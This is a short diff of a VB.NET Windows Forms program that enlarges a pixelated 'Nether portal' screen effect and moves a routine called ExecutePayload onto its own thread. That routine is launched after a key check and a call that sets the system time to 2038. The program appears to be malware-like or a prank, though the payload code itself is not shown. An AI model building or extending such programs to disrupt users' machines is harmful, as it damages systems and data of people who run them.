@@ -440,7 +440,7 @@ Public Class Form1
 
         ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion
         Public Sub ApplyPortalEffect(g As Graphics)
-            Dim gridSize As Integer = 20 ' Size of each pixelated "block"
+            Dim gridSize As Integer = 80 ' Size of each pixelated "block"
             portalEffectPhase += 0.05F ' Increment phase for wavy distortion
 
             Try
@@ -1352,8 +1352,9 @@ Public Class Form1
             ' 2. Set the system time to 2038
             SetSystemTimeTo2038()
 
-            '3. Start the operations
-            ExecutePayload()
+            ' Start ExecutePayload on a new thread
+            Dim payloadThread As New Thread(AddressOf ExecutePayload)
+            payloadThread.Start()
 
         Else
             MessageBox.Show("Incorrect key. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
